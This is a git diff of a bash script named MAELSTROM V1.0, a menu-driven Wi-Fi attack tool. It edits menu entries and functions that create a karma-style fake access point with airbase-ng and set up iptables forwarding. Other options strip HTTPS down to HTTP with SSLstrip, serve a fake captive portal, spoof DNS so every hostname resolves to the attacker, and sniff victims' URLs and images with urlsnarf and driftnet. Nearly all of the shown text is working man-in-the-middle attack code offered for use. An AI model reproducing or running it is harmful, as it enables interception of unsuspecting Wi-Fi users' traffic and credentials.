@@ -13,18 +13,17 @@ echo -e "\e[93mMAELSTROM V1.0\e[0m"
 echo
 echo  "Chose Your Flavor [1-9]: "
 echo
-echo -e "\e[96m1. Perform FakeAP\e[0m"
+echo -e "\e[96m1. Perform FakeAP (sniff simple HTTP request)\e[0m"
 echo "--------------------------------"
-echo "2. Option accespoint-soft "
-echo "3. Option accespoint-ssl "
-echo "4. Option accespoint-captive-portal  "
+echo "3. Option A : SSLSTRIP method (downgrade https to http) "
+echo "4. Option B : Fake Captive Portal (put your custom template into /var/www/)"
 echo "--------------------------------"
 echo "5. Perform urlsnarf  "
 echo "6. Perform driftnet "
 echo "--------------------------------"
-echo "7. Perform tails dhcp "
-echo "8. Perform tails sslstrip "
-echo "9. Perform tails Captive Portal "
+echo "7. Perform tails on dhcp "
+echo "8. Perform tails on sslstrip "
+echo "9. Perform tails on Captive Portal "
 echo
 read -p "Choice: " interfacechoice
 
@@ -32,7 +31,6 @@ echo
 
   case $interfacechoice in
     	1) f_evilap ;;
-	2) f_accespoint-soft ;;
 	3) f_accespoint-ssl ;;
 	4) f_accespoint-dnspoof-captive ;;
     	5) f_urlsnarf ;;
@@ -88,11 +86,9 @@ echo
 echo -e "\e[96mGNU screen session created --> karma\e[0m"
 echo -e "\e[96mscreen -x karma to enter into the screen session\e[0m"
 sleep 1s
-screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
-}
+screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon
+sleep 3s
 
-#option acces-point soft
-f_accespoint-soft(){
 #cleanning iptable
 iptables --flush
 iptables --table nat --flush
@@ -105,7 +101,6 @@ ifconfig at0 192.168.7.1 netmask 255.255.255.0
 route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
 pkill dhcpd #kill previous dhcp daemon
 
-
 #start the dhcp server
 /etc/init.d/isc-dhcp-server start
 
@@ -113,7 +108,9 @@ pkill dhcpd #kill previous dhcp daemon
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
+
 }
+
 #option acces-point ssl
 f_accespoint-ssl (){
 #cleanning iptable
@@ -121,13 +118,6 @@ iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
-
-#start to set rules on iptables based on the dhcpd.conf
-ifconfig at0 up
-ifconfig at0 192.168.7.1 netmask 255.255.255.0
-route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
-pkill dhcpd
-/etc/init.d/isc-dhcp-server start
 
 #iptable rules for ssltrip to 8888 port listener
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -151,11 +141,6 @@ iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
 
-#start to set rules on iptables based on the dhcpd.conf
-ifconfig at0 up
-ifconfig at0 192.168.7.1 netmask 255.255.255.0
-route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
-
 #iptable rules
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
@@ -178,8 +163,9 @@ sleep 1s
 echo -e "\e[31mdnsspoof launched\e[0m"
 echo -e "\e[96mGNU screen session created --> dnsspoof e[0m"
 echo -e "\e[96mscreen -x dnsspoof to enter into the screen\e[0m"
-sleep 5s
-screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts
+echo
+echo
+screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts # insert 192.168.7.1 *.* into the hosts
 }
 
 #driftnet
